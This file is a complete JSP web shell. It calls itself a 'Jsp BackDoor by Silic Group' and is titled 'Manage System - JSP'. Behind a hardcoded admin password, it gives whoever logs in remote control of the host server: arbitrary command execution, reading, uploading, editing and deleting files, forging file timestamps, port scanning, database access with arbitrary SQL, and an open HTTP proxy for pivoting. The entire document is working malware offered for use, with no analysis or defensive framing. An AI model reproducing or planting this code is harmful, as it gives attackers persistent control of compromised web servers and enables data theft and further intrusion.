<%@page import="java.util.*,java.io.*,java.sql.*,java.util.zip.*,java.lang.reflect.*,java.net.*,javax.servlet.jsp.*"%>
<%@page pageEncoding="gbk"%>
<%!
final String APP_NAME="Manage System - JSP";
int portListen=5000;
boolean openHttpProxy=false;
void mainForm(String web_Site,JspWriter out)throws Exception{
    out.print("<table width=100% height=100% border=0 bgcolor=menu>");
    out.print("<tr><td height=30 colspan=2>");
    out.print("<table width=100% height=25 border=0>");
    out.print("<form name=address method=post target=FileFrame onSubmit='checkUrl();'>");
    out.print("<tr><td width=60 align=center>FilePath:</td><td>");
    out.print("<input name=FolderPath style=width:100% value='"+web_Site+"' onchange='checkUrl();'>");
    out.print("<input type=hidden name=Action value=F>");
    out.print("<input type=hidden name=Filename>");
    out.print("</td><td width=60 align=center><a href='javascript:checkUrl();'>GOtoLink</a>");
    out.print("</td></tr></form></table></td></tr><tr><td width=148>");
    out.print("<iframe name=Menu src=?Action=M width=100% height=100% frameborder=2 scrolling=yes></iframe></td>");
    out.print("<td width=600>");
    out.print("<iframe name=FileFrame src='?Action=F&FolderPath="+web_Site+"' width=100% height=100% frameborder=1 scrolling=yes></iframe>");
    out.print("</td></tr></table>");
}
void mainMenu(JspWriter out,String web_Site)throws Exception{
    out.println("<table>");
    out.println("<tr><td bgcolor=Gray><a href=?Action=M>"+ico(58)+"FileOperation(File.class)</a></td></tr>");
    out.println("<tr><td bgcolor=menu onclick=top.address.FolderPath.value='"+folderReplace(web_Site)+"'><a href='?Action=F&FolderPath="+web_Site+"' target=FileFrame>"+ico(48)+"WEB Folder</a></td></tr>");
    out.println("<tr><td bgcolor=menu><a href=?Action=S target=FileFrame>"+ico(53)+"SystemInfo(System.class)</a></td></tr>");
    out.println("<tr><td bgcolor=menu><a href=?Action=L target=FileFrame>"+ico(53)+"ServletInfo</a></td></tr>");
    out.println("<tr><td bgcolor=menu><a href=?Action=T target=FileFrame>"+ico(53)+"SystemTools</a></td></tr>");
    out.println("<tr><td bgcolor=menu><a href=?Action=i target=FileFrame>"+ico(57)+"Interfaces</a></td></tr>");
    out.println("<tr><td bgcolor=menu><a href='http://blackbap.org/' target=FileFrame>About Silic Group</a></td></tr>");
    out.println("</table>");
}
void showFiles(JspWriter out,String path)throws Exception{
    File file=new File(path);
    long maxSize=0;
    if(file.isDirectory()&&file.exists()){
        File[] f=file.listFiles();
        out.println("<table><tr bgcolor=menu><td>name</td><td>type</td><td>size</td><td>modify date</td><td>readonly</td><td>can write</td><td>hidden</td><td>Action</td></tr>");
        for(int i=0;i<f.length;i++){
            maxSize=maxSize+f[i].length();
            if(f[i].isDirectory())
                out.println("<tr bgcolor=menu><td><a href=\"javascript:top.address.FolderPath.value='"+folderReplace(f[i].getAbsolutePath())+"/';checkUrl();\">"+ico(48)+f[i].getName()+"</a></td><td> DIR </td><td>"+getSize(f[i].length())+"</td><td>"+new java.util.Date(f[i].lastModified())+"</td><td>"+f[i].canRead()+"</td><td>"+f[i].canWrite()+"</td><td>"+f[i].isHidden()+"</td><td>"+fOperation(true,f[i].getAbsolutePath())+"</td></tr>");
            else
                out.println("<tr><td>"+ico(50)+f[i].getName()+"</td><td> file </td><td>"+getSize(f[i].length())+"</td><td>"+new java.util.Date(f[i].lastModified())+"</td><td>"+f[i].canRead()+"</td><td>"+f[i].canWrite()+"</td><td>"+f[i].isHidden()+"</td><td>"+fOperation(false,f[i].getAbsolutePath())+"</td></tr>");
        }
        out.println("</table>");
        out.print("this folder size:"+getSize(maxSize));
    }
}
void showSystemInfo(JspWriter out)throws Exception{
    Map map=null;
    Set set=null;
    Iterator it=null;

    map=System.getProperties();
    set=map.keySet();
    it=set.iterator();
    out.println("<hr>System Property info:<ul>");
        while(it.hasNext()){
        Object oName=it.next();
        out.println("<li>"+oName+" [ "+map.get(oName)+" ]");
    }
    out.print("</ul><hr>System CPU :");
    out.print(Runtime.getRuntime().availableProcessors()+" <br>");
    out.print("the JVM Free Memory :"+getSize(Runtime.getRuntime().freeMemory()));
    out.print("<br>the JVM Max Memory :"+getSize(Runtime.getRuntime().maxMemory()));
}
void servletInfo(ServletConfig config,JspWriter out)throws Exception{
    ServletContext sc=config.getServletContext();
    out.println("Server info: "+sc.getServerInfo()+"<br>");
    out.println("ServletContext name: "+sc.getServletContextName()+"<br>");
    out.println("Major version :"+sc.getMajorVersion()+"<br>");
    out.println("Minor version :"+sc.getMinorVersion()+"<br>");
    Enumeration en=sc.getInitParameterNames();
    String initInfo="init parameter: <br>";
    out.print(initInfo);
    while(en.hasMoreElements()){
        String name=(String)en.nextElement();
        initInfo="key:"+name+" value:"+sc.getInitParameter(name) +"<br>";
        out.print(initInfo);
    }
  
}
void downFile(String filename,HttpServletResponse res)throws Exception{
    int w=0;
    byte[] buffer=new byte[256];
    byte[] b=(new File(filename)).getName().getBytes();
    String outFile=new String(b,"ISO-8859-1");
    res.reset();
    res.setHeader("Content-disposition","attachment;filename=\""+outFile+"\"");
    ServletOutputStream sos=res.getOutputStream();
    BufferedInputStream bis=null;
    try{
        bis=new BufferedInputStream(new FileInputStream(filename));
        while((w=bis.read(buffer,0,buffer.length))!=-1){
            sos.write(buffer,0,w);
        }
    }catch(Exception e){
    }finally{
        if(bis!=null)bis.close();
    }
    sos.flush();
    res.flushBuffer();
}
void deleteFile(String filename,JspWriter out)throws Exception{
    File f=new File(filename);
    if(f.exists()){
        if(f.delete())out.print(filename+"delete success...");
    }else{
        out.print("file not find!!");
    }
}
void renameFile(String filename,JspWriter out)throws Exception{
    int split=filename.indexOf("|");
    String newFilename=filename.substring(split+1);
    filename=filename.substring(0,split);
    File f=new File(filename);
    if(f.exists()){
        if(f.renameTo(new File(newFilename)))out.print(newFilename+" file move success");
    }else{
        out.print("file not find!");
    }
}
void copyFile(String filename,JspWriter out)throws Exception{
    int split=filename.indexOf("|");
    String newFilename=filename.substring(split+1);
    filename=filename.substring(0,split);
    File f=new File(filename);
    BufferedInputStream bis=null;
    BufferedOutputStream bos=null;
    if(f.exists()){
        try{
            bis=new BufferedInputStream(new FileInputStream(filename));
            bos=new BufferedOutputStream(new FileOutputStream(newFilename));
            int s=0;
            while((s=bis.read())!=-1){
                bos.write(s);
            }
        }catch(Exception e){
            out.print("file copy failed");
        }finally{
            if(bis!=null)bis.close();
            if(bos!=null)bos.close();
        }
        out.print(newFilename+"file copy success");
    }else{
        out.print("file not find!");
    }
}
void editFile(String filename,JspWriter out)throws IOException{
    File f=new File(filename);
    out.print("<form method=post>File Path:");
    out.print("<input type=text size=80 name=filename value='"+filename+"'>");
    out.print("<input type=button name=kFile onClick='this.form.action=\"?Action=K\";this.form.submit();' value=KeepFile >");
    out.print("<input type=button onClick=editFile(this.form.filename.value); value=ReadFile>");
    out.print("<textarea name=FileContent rows=35 style=width:100%;>");
    if(f.exists()){
        try{
            BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(filename),"Gb2312"));
            String s="";
            while((s=br.readLine())!=null){
                out.println(htmlEntity(s));
            }
        }catch(Exception e){
            out.print("file edit failed");
        }finally{
        }
    }
    out.print("</textarea></form>");
}
void saveFile(String filename,byte[] fileContent,JspWriter out)throws IOException{
    if(filename!=null||fileContent!=null){
        BufferedOutputStream bos=null;
        try{
            bos=new BufferedOutputStream(new FileOutputStream(filename));
            bos.write(fileContent,0,fileContent.length);
        }finally{
            if(bos!=null)bos.close();
        }
        out.print(filename+"file save success");
    }else{
        out.print("Error");
    }
}
void dateChange(String filename,String year,String month,String day,JspWriter out)throws IOException{
    File f=new File(filename);
    if(f.exists()){
        Calendar calendar=Calendar.getInstance();
        calendar.set(Integer.parseInt(year),Integer.parseInt(month),Integer.parseInt(day));
        if(f.setLastModified(calendar.getTimeInMillis()))
            out.print(filename+"file date change success");
        else
            out.print(filename+"file date change error");
    }else{
        out.println("file not find!!!");
    }
}
void execFile(String file,JspWriter out)throws Exception{
    int i=0;
    Runtime rt=Runtime.getRuntime();
    Process ps=rt.exec(file);
    InputStreamReader isr = null;
    char[] bufferC=new char[1024];
    try{
        isr=new InputStreamReader(ps.getInputStream(),"GB2312");
        out.print("<textarea rows=35 style=width:100%;>");
        while((i=isr.read(bufferC,0,bufferC.length))!=-1){
            out.print(htmlEntity(new String(bufferC,0,i)));
        }
    }catch(Exception e){
        out.print("run file error");
    }finally{
        if(isr!=null)isr.close();
    }
    out.print("</textarea>");
    systemTools(out);
}
void zip(String zipPath, String srcPath,JspWriter out) throws Exception {
    FileOutputStream output = null;
    ZipOutputStream zipOutput = null;
    try{
        output = new FileOutputStream(zipPath);
        zipOutput = new ZipOutputStream(output);
        zipEntry(zipOutput,srcPath,srcPath,zipPath);
    }catch(Exception e){
        out.print("file zip error");
    }finally{
        if(zipOutput!=null)zipOutput.close();
    }
    out.print("zip ok"+zipPath);
}
void zipEntry(ZipOutputStream zipOs, String initPath,String filePath,String zipPath) throws Exception {
    String entryName = filePath;
    File f = new File(filePath);
    if (f.isDirectory()){
        String[] files = f.list();
        for(int i = 0; i < files.length; i++)
            zipEntry(zipOs, initPath, filePath + File.separator + files[i],zipPath);
        return;
    }
    String chPh = initPath.substring(initPath.lastIndexOf("/") + 1);
    int idx=initPath.lastIndexOf(chPh);
    if (idx != -1) {
        entryName = filePath.substring(idx);
    }
    ZipEntry entry;
    entry = new ZipEntry(entryName);
    File ff = new File(filePath);
    if(ff.getAbsolutePath().equals(zipPath))return;
    entry.setSize(ff.length());
    entry.setTime(ff.lastModified());
    entry.setCrc(0);
    CRC32 crc = new CRC32();
    crc.reset();
    zipOs.putNextEntry(entry);
    int len = 0;
    byte[] buffer = new byte[2048];
    int bufferLen = 2048;
    FileInputStream input =null;
    try{
        input = new FileInputStream(filePath);
        while ((len = input.read(buffer, 0, bufferLen)) != -1) {
                zipOs.write(buffer, 0, len);
                crc.update(buffer, 0, len);
        }
    }catch(Exception e){
    }finally{
        if(input!=null)input.close();
    }
    entry.setCrc(crc.getValue());
}
void upfile(HttpServletRequest request,JspWriter out,String filename)throws Exception{
        String boundary = request.getContentType().substring(30);
        ServletInputStream sis=request.getInputStream();
        BufferedOutputStream bos=null;
        byte[] buffer = new byte[1024];
        int line=-1;
        for(int i=0;i<5;i++){
            line=readLine(buffer,sis,boundary);
        }
        try{
            bos=new BufferedOutputStream(new FileOutputStream(filename));
            while(line!=-1){
                bos.write(buffer,0,line);
                line=readLine(buffer,sis,boundary);
            }
            out.print("upload success");
        }catch(Exception e){
            out.print("upload failed!");
        }finally{
            if(bos!=null)bos.close();
        }
}
int readLine(byte[] lineByte,ServletInputStream servletInputstream,String endStr){
    try{
        int len=0;
        len=servletInputstream.readLine(lineByte,0,lineByte.length);
        String str=new String(lineByte,0,len);
        System.out.println(str);
        if(str.indexOf(endStr)==-1)
            return len;
        else
            return -1;
    }catch(Exception _ex){
        return -1;
    } 
}
void newFolder(JspWriter out,String foldername)throws Exception{
    File f=new File(foldername);
    if(f.mkdirs()){
        out.print("create folder success");
    }else{
        out.print("create folder failed!");
    }
}
void reflectAPI(JspWriter out,String className)throws Exception{
    Class cls=Class.forName(className);
    String constructor="";
    String ifString="";
    Class[] interfaces=cls.getInterfaces();
    String supperClass=cls.getSuperclass().toString();
    Constructor[] c=cls.getDeclaredConstructors();
    Field[] f=cls.getDeclaredFields();
    Method[] m=cls.getDeclaredMethods();
   
    for(int i=0;i<interfaces.length;i++){
        ifString=ifString+interfaces[i].getName()+",";
    }
    out.print("<strong>"+Modifier.toString(cls.getModifiers())+"</strong> "+cls+"<br><strong>extends</strong> "+supperClass+" <strong><br>implemets</strong> "+ifString);
    out.print("<br>{<br><EM>Constructor:</EM><br>");
    for(int i=0;i<c.length;i++)
        out.print("     "+c[i]+"<br>");
    out.print("<EM>Field:</EM><br>");
    for(int i=0;i<f.length;i++)
        out.print("     "+f[i]+"<br>");
    out.print("<EM>Function:</EM><br>");
    for(int i=0;i<m.length;i++)
        out.print("     "+m[i]+"<br>");
    out.print("<br>}");
}
void scanPort(JspWriter out,String strAddress,int startPort,int endPort)throws Exception{
    if(endPort<startPort||startPort<=0||startPort>65535||endPort>65535||endPort<=0){
        out.print("port setup error");
        return;
    }
    InetAddress ia=InetAddress.getByName(strAddress);
    for(int p=startPort;p<=endPort;p+=15){
        (new ScanPort(ia,p,p+14,out)).start();
    }
    Thread.sleep((int)(endPort/startPort)*5000);
}
class ScanPort extends Thread{
    int startPort;
    int endPort;
    InetAddress address;
    javax.servlet.jsp.JspWriter out;
    public ScanPort(InetAddress address,int startPort,int endPort,JspWriter out){
        this.address=address;
        this.startPort=startPort;
        this.endPort=endPort;
        this.out=out;
    }
    public void run(){
       Socket s=null;
       for(int port=startPort;port<=endPort;port++){
           try{
               s=new Socket(address,port);
               out.println("port "+port+" is Open<br>");
           }
           catch(IOException e){
           }finally{
                try{s.close();}catch(Exception e){}
           }
       }
    }
}
public void switchProxyService(JspWriter out)throws Exception{
 if(openHttpProxy=!openHttpProxy){
  new RunProxyService(portListen).start();
  out.print("Proxy running");
 }else{
  out.print("Proxy closed");
 }
}
public class RunProxyService extends Thread{
 int port;
 public RunProxyService(int port){
  this.port=port;
 }
 public void run(){
  try {
   ServerSocket ss=new ServerSocket(5000);
   while(true){
    if(openHttpProxy){
     new HttpProxy(ss.accept()).start();
    }else{
     break;
    }
   }
   ss.close();
  } catch (IOException e) {
  }
 }
}
public class HttpProxy extends Thread{
 private Socket s;
 public int timeOut=10000;
 public HttpProxy(Socket s){
  this.s=s;
 }
 public HttpProxy(Socket s,int timeOut){
  this.s=s;
  this.timeOut=timeOut;
 }
 public void run(){
  byte[] bit=new byte[1024];
  int readBit=0;
  int size=0;
  String returnAddress=null;
  int returnPort = 0;
  String sendHostName=null;
  int sendPort=0;
  Socket sendSocket=null;
  OutputStream os=null;
  InputStream is=null;
  try{
   int split=0;
   is=s.getInputStream();
   if((size=is.read(bit, 0, bit.length))==-1)return;
   String httpHead=new String(bit,0,size);
   split=httpHead.indexOf("\nHost: ")+7;
   sendHostName=httpHead.substring(split, httpHead.indexOf("\n", split));
   if((split=sendHostName.indexOf(':'))!=-1){
    sendPort=Integer.parseInt(sendHostName.substring(split+1).trim());
    sendHostName=sendHostName.substring(0,split);
    sendSocket=new Socket(sendHostName.trim(),sendPort);
   }else{
    sendSocket=new Socket(sendHostName.trim(),80);
   }
   sendSocket.setSoTimeout(timeOut);
   os=sendSocket.getOutputStream();
   os.write(httpHead.getBytes());
   if(size==bit.length)
   while((size=is.read(bit, 0, bit.length))!=-1){
    os.write(bit,0 , size);
   }
   os.flush();
   is=sendSocket.getInputStream();
   os=s.getOutputStream();
  
   while((size=is.read(bit, 0, bit.length))!=-1){
    os.write(bit,0 , size);
    os.flush();
   }
  }catch(SocketException se){
  } catch (IOException ie) {
  } catch (Exception e) {
  }finally{
   if(is!=null){
    try {
     is.close();
    } catch (IOException e) {
    }
   }
   if(os!=null){
    try {
     os.close();
    } catch (IOException e) {
    }
   }
  }
 }
}
void ConnectionDBM(JspWriter out,String driver,String url,String userName,String passWord,String sqlAction,String sqlCmd)throws Exception{
 DBM dbm=new DBM(driver,url,userName,passWord,out);
 if(sqlAction.equals("LDB")){
  dbm.lookInfo();
 }else{
  dbm.executeSQL(sqlCmd);
 }
 dbm.closeAll();
}
class DBM{
    private JspWriter out;
    private Connection con;
    private Statement stmt;
    private ResultSet rs;
    public DBM(String driverName,String url,String userName,String passWord,JspWriter out)throws Exception{
        Class.forName(driverName);
        this.out=out;
        con=DriverManager.getConnection(url,userName,passWord);
    }
    public void lookInfo()throws Exception{
     DatabaseMetaData dbmd=con.getMetaData();
     String tableType=null;
     out.print("<strong>DataBaseInfo</strong><table>");
     out.print("<tr><td>DataBaseName:</td><td>"+dbmd.getDatabaseProductName()+"</td></tr>");
     out.print("<tr><td>DataBaseVersion:</td><td>"+dbmd.getDatabaseProductVersion()+"</td></tr>");
     out.print("<tr><td>the Numeric Function:</td><td>"+dbmd.getNumericFunctions()+"</td></tr>");
     out.print("<tr><td>the String Function:</td><td>"+dbmd.getStringFunctions()+"</td></tr>");
     out.print("<tr><td>the TimeDate Function:</td><td>"+dbmd.getTimeDateFunctions()+"</td></tr>");
     out.print("<tr><td>the System Function:</td><td>"+dbmd.getSystemFunctions()+"</td></tr>");
     out.print("</table>");
     out.print("<strong>ProcedureInfo</strong><table>");
     try{
      getProcedureDetail(dbmd.getProcedures(null,null,null));
     }catch(Exception proE){}
     try{
      rs=dbmd.getTables(null,null,null,null);
     }catch(Exception tabE){}
     out.print("<strong>DataBase Tables Info</strong><br>");
     while(rs.next()){
      tableType=rs.getString(4);
      out.print("<strong>TableName:</strong>"+rs.getString(3)+" <strong>Type:</strong>"+tableType+"<br>");
      if(tableType.indexOf("VIEW")>=0||tableType.indexOf("TABLE")>=0){
       try{
        getTableDetail(dbmd.getColumns(null,null,rs.getString(3),null));
       }catch(Exception columnE){}
      }
     }
     this.closeAll();
    }
    private void getTableDetail(ResultSet tableRs)throws Exception{
        out.print("<table border=1><tr><td>Column Name</td><td>Data Type</td><td>Type Name</td><td>COLUMN_SIZE</td><td>IS_NULLABLE</td><td>CHAR_OCTET_LENGTH</td></tr>");
        while(tableRs.next()){
            out.print("<tr><td>"+tableRs.getString(4)+"</td><td>"+tableRs.getInt(5)+"</td><td>"+tableRs.getString(6)+"</td><td>"+tableRs.getInt(7)+"</td><td>"+tableRs.getString(18)+"</td><td>"+tableRs.getInt(16)+"</td></tr>");
        }
        out.print("</table>");
        tableRs.close();
    }
    private void getProcedureDetail(ResultSet procRs)throws Exception{
     out.print("<table border=1><tr><td>PROCEDURE_NAME</td><td>REMARKS</td><td>PROCEDURE_TYPE</td></tr>");
     while(procRs.next()){
      out.print("<tr><td>"+procRs.getString(3)+"</td><td>"+procRs.getString(7)+"</td><td>"+procRs.getShort(8)+"</td></tr>");
     }
     out.print("</table>");
     procRs.close();
    }
    public void executeSQL(String sqlCmd)throws Exception{
     stmt=con.createStatement();
     if(sqlCmd.trim().toLowerCase().startsWith("select")){
      rs=stmt.executeQuery(sqlCmd);
      ResultSetMetaData rsmd=rs.getMetaData();
      int ColumnCount=rsmd.getColumnCount();
      out.print("<table border=1><tr>");
      for(int i=1;i<=ColumnCount;i++){
       out.print("<td>"+rsmd.getColumnName(i)+"</td>");
      }
      out.print("</tr>");
      while(rs.next()){
       out.print("</tr>");
          for(int i=1;i<=ColumnCount;i++){
           out.print("<td>"+rs.getString(i)+"</td>");
          }
          out.print("</tr>");
      }
     }else{
      stmt.executeUpdate(sqlCmd);
      out.print("execute success");
     }
    }
    public void closeAll()throws SQLException{
        try{
            if(rs!=null)rs.close();
        }catch(Exception e){
        }
        try{
            if(stmt!=null)stmt.close();
        }catch(Exception e){
        }
        try{
         if(con!=null)con.close();
        }catch(Exception e){
        }
    }
}
void systemTools(JspWriter out)throws Exception{
    out.print("<table border=1>");
    out.print("<tr><form method=post action='?Action=run'><td bordercolorlight=Black bgcolor=menu>System class run</td>");
    out.print("<td colspan=2>filepath:<input name=execFile size=75 type=text title='d:\\cmd.exe /c dir c:'></td><td><input name=go type=submit value=run></td></form></tr>");
    out.print("<tr><form method=post enctype=\"multipart/form-data\" action='?Action=Upfile'><td bordercolorlight=Black bgcolor=menu>file upload</td>");
    out.print("<td colspan=2>file:<input name=file type=file>upload file<input title='d:\\silic.txt' name=UPaddress size=35 type=text></td><td><input name=up onclick=\"this.form.action+='&UPaddress='+this.form.UPaddress.value;\" type=submit value=upl></td></form></tr>");
    out.print("<tr><form method=post action='?Action=EditFile'><td bordercolorlight=Black bgcolor=menu>new file</td><td colspan=2>file name:<input name=Filename type=text size=50></td><td><input name=submit type=submit value=new></td>");
    out.print("</form></tr>");
    out.print("<tr><form method=post action='?Action=newFolder'><td bordercolorlight=Black bgcolor=menu>Create folder</td><td colspan=2>folder name:<input name=Filename type=text size=50></td><td><input name=submit type=submit value=new></td>");
    out.print("</form></tr>");
    out.print("<tr><form method=post action='?Action=APIreflect'><td bordercolorlight=Black bgcolor=menu>Reflect API</td><td colspan=2>Class Name:<input name=Filename title=java.lang.String type=text size=50></td><td><input name=submit type=submit value=ref></td>");
    out.print("</form></tr>");
    out.print("<tr><form method=post action='?Action=IPscan'><td bordercolorlight=Black bgcolor=menu>Scan Port</td><td>IP:<input name=IPaddress type=text size=20></td><td>Start Port:<input name=startPort title=1-65535 type=text size=5>End Port:<input name=endPort title=1-65535 type=text size=5></td><td><input name=submit type=submit value=sca></td>");
    out.print("</form></tr>");
    out.print("<tr><form method=post action='?Action=sql'>");
    out.print("<td bordercolorlight=Black bgcolor=menu>DBM");
    out.print("<select name=DB onChange='setDataBase(this.form);'><option>Sybase</option><option>Mssql</option><option>Mysql</option><option>Oracle</option><option>DB2</option><option>PostgreSQL</option></select></td><td>");
    out.print("Driver:<input name=driver type=text>URL:<input name=conUrl type=text>user:<input name=user type=text size=3>password:<input name=password type=text size=3></td>");
    out.print("<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>");
    out.print("<td><input name=run type=submit value=LDB></td>");
    out.print("</form></tr>");
    if(!openHttpProxy){
     out.print("<tr><td><a href='?Action=HttpProxy' target=FileFrame>OpenTheHttpProxy</a></td></tr>");
    }else{
     out.print("<tr><td><a href='?Action=HttpProxy' target=FileFrame>CloseTheHttpProxy</a></td></tr>");
    }
    out.print("</table>");
}
void userInterFaces(JspWriter out)throws Exception{
out.print("Recode by <a href='http://blackbap.org/'>Silic Group Inc.</a>");
}

String encodeChange(String str)throws Exception{
    if(str==null)
        return null;
    else
        return new String(str.getBytes("ISO-8859-1"),"gb2312");
}
String folderReplace(String folder){
    return folder.replace('\\','/');
}
String fOperation(boolean f,String file){
    if(f)
        return "<a href=\"javascript:delFile('"+folderReplace(file)+"')\">Delete</a> <a href=\"javascript:reName('"+folderReplace(file)+"')\">Rename</a> <a href=\"javascript:setDate('"+folderReplace(file)+"')\">setDate</a> <a href=\"javascript:zipFile('"+folderReplace(file)+"')\">Zip</a>";
    else
        return "<a href=\"javascript:delFile('"+folderReplace(file)+"')\">Delete</a> <a href=\"javascript:reName('"+folderReplace(file)+"')\">Rename</a> <a href=\"javascript:setDate('"+folderReplace(file)+"')\">setDate</a> <a href=\"javascript:copyFile('"+folderReplace(file)+"')\">Copy</a> <a href=\"javascript:editFile('"+folderReplace(file)+"')\">Edit</a> <a href=\"javascript:downFile('"+folderReplace(file)+"');\">Down</a>";
}
String getSize(long size){
    if(size>=1024*1024*1024){
        return new Long(size/1073741824L)+"G";
    }else if(size>=1024*1024){
        return new Long(size/1048576L)+"M";
    }else if(size>=1024){
        return new Long(size/1024)+"K";
    }else
        return size+"B";
}
String ico(int num){
    return "<font face=wingdings size=3>&#"+num+"</font>";
}
String htmlEntity(String htmlCode){
 StringBuffer sb=new StringBuffer();
 char c=0;
 for(int i=0;i<htmlCode.length();i++){
  c=htmlCode.charAt(i);
  if(c=='<')sb.append("<");
  else if(c=='>')sb.append(">");
  else if(c==' ')sb.append(" ");
  else sb.append(c);
 }
 return sb.toString();
}
%>
<%
    session.setMaxInactiveInterval(6000);
    final String WEB_SITE=folderReplace(application.getRealPath("/"));
    final String URL=request.getRequestURI();
    if(session.getAttribute("ID")==null){
        String username="admin";
        String password="silic";
  if(request.getParameter("Silic")!=null&&request.getParameter("juliet")!=null&&request.getParameter("Silic").equals(username)&&request.getParameter("juliet").equals(password)){
            session.setAttribute("ID","1");
            response.sendRedirect(URL);
        }else{
            out.println("<center style=font-size:12px><br><br>"+"Jsp BackDoor by Silic Group Juliet"+"<br><br>" +
                    "<form name=login method=post>username:<input name=Silic type=text size=15><br>" +
                    "password:<input name=juliet type=password size=15><br><input type=submit value=Login></form></center>");
        }
        return;
    }
%>
<html>
<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<title><%=APP_NAME%></title>
<style type="text/css">
body,td{font-size: 12px;}
table{T:expression(this.border='1',this.borderColorLight='Black',this.borderColorDark='White');}
input,select{font-size:12px;}
body{margin-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;}
td{white-space:nowrap;}
a{color:black;text-decoration:none;}
</style>
<script>
    Top=top.address;
    function downFile(file){
        Top.Filename.value=file;
        Top.Action.value="D";
        Top.submit();
    }
    function checkUrl(){
        top.address.Action.value="F";
        top.address.submit();
    }
    function editFile(file){
        top.address.Action.value="E";
        top.address.Filename.value=file;
        top.address.submit();
    }
    function delFile(file){
        top.address.Action.value="R";
        top.address.Filename.value=file;
        top.address.submit();
    }
    function reName(file){
        if((Rname=prompt("rename to?",file))!=""&&Rname!=null){
            Top.Action.value="N";
            top.address.Filename.value=file+"|"+Rname;
            Top.submit();
        }
    }
    function copyFile(file){
        if((Rname=prompt("copy to?",file))!=""&&Rname!=null){
            Top.Action.value="P";
            top.address.Filename.value=file+"|"+Rname;
            Top.submit();
        }
    }
    function setDate(file){
        document.write("Change date:<br><form method='post' action='?Action=dateChange'>");
        document.write("filename:<input name='Filename' type='text' size=60 readonly value='"+file+"'><br>");
        document.write("Year:<select name='year'>");
        for(i=1970;i<=2050;i++){
            document.write("<option value="+i+">"+i+"</option>");
        }
        document.write("</select>");
        document.write("Month:<select name='month'>");
        for(i=1;i<=12;i++){
            document.write("<option value="+i+">"+i+"</option>");
        }
        document.write("</select>");
        document.write("Day:<select name='day'>");
        for(i=1;i<=31;i++){
            document.write("<option value="+i+">"+i+"</option>");
        }
        document.write("</select>");
        document.write("<input name='Action' type='button' onclick='top.address.Action.value=\"d\";this.form.submit();' value='dateChange'>");
        document.write("<input name='cancel' onclick='history.back();' type='button' value='Cancel'>");
    }
    function zipFile(file){
        if((zipF=prompt("save to ?",file+"/down.zip"))!=""&&zipF!=null){
            top.address.Action.value="Z";
            top.address.FolderPath.value=file;
            top.address.Filename.value=zipF;
            top.address.submit();
        }
    }
    function setDataBase(f){
        driverName=new Array();
        driverName[0]="com.sybase.jdbc2.jdbc.SybDriver";
        driverName[1]="com.microsoft.jdbc.sqlserver.SQLServerDriver";
        driverName[2]="com.mysql.jdbc.Driver";
        driverName[3]="oracle.jdbc.driver.OracleDriver";
        driverName[4]="com.ibm.db2.jdbc.app.DB2Driver";
        driverName[5]="org.postgresql.Driver";
        conUrl=new Array();
        conUrl[0]="jdbc:jtds:sybase://host:port/database";
        conUrl[1]="jdbc:microsoft:sqlserver://host:port;DatabaseName=";
        conUrl[2]="jdbc:mysql://host:port/database";
        conUrl[3]="jdbc:oracle:thin:@123.234.222.222:1521:orcl";
        conUrl[4]="jdbc:db2://host:port/database";
        conUrl[5]="jdbc:postgresql://host:port/database";
        f.driver.value=driverName[f.DB.selectedIndex];
        f.conUrl.value=conUrl[f.DB.selectedIndex];
    }
</script>
</head>
<body>
<%
    String Action=request.getParameter("Action");
    char action=(Action==null?"0":Action).charAt(0);
    try{
        switch(action){
            case 'M':mainMenu(out,WEB_SITE);break;
            case 'F':showFiles(out,encodeChange(request.getParameter("FolderPath")));break;
            case 'S':showSystemInfo(out);break;
            case 'L':servletInfo(config,out);break;
            case 'D':downFile(encodeChange(request.getParameter("Filename")),response);return;
            case 'E':editFile(encodeChange(request.getParameter("Filename")),out);break;
            case 'R':deleteFile(encodeChange(request.getParameter("Filename")),out);break;
            case 'K':saveFile(encodeChange(request.getParameter("filename")),request.getParameter("FileContent").getBytes("ISO-8859-1"),out);break;
            case 'N':renameFile(encodeChange(request.getParameter("Filename")),out);break;
            case 'P':copyFile(encodeChange(request.getParameter("Filename")),out);break;
            case 'd':dateChange(encodeChange(request.getParameter("Filename")),request.getParameter("year"),request.getParameter("month"),request.getParameter("day"),out);break;
            case 'r':execFile(encodeChange(request.getParameter("execFile")),out);break;
            case 'Z':zip(encodeChange(request.getParameter("Filename")),encodeChange(request.getParameter("FolderPath")),out);break;
            case 'U':upfile(request,out,encodeChange(request.getParameter("UPaddress")));break;
            case 'n':newFolder(out,encodeChange(request.getParameter("Filename")));break;
            case 'A':reflectAPI(out,encodeChange(request.getParameter("Filename")));break;
            case 'I':scanPort(out,encodeChange(request.getParameter("IPaddress")),Integer.parseInt(request.getParameter("startPort")),Integer.parseInt(request.getParameter("endPort")));break;
            case 's':ConnectionDBM(out,encodeChange(request.getParameter("driver")),encodeChange(request.getParameter("conUrl")),encodeChange(request.getParameter("user")),encodeChange(request.getParameter("password")),encodeChange(request.getParameter("run")),encodeChange(request.getParameter("sqlcmd")));break;
            case 'H':switchProxyService(out);break;
            case 'i':userInterFaces(out);break;
            case 'T':systemTools(out);break;
            default:
                mainForm(WEB_SITE,out);break;
        }
    }catch(Exception e){
    }
    out.print("</body></html>");
    out.close();
%>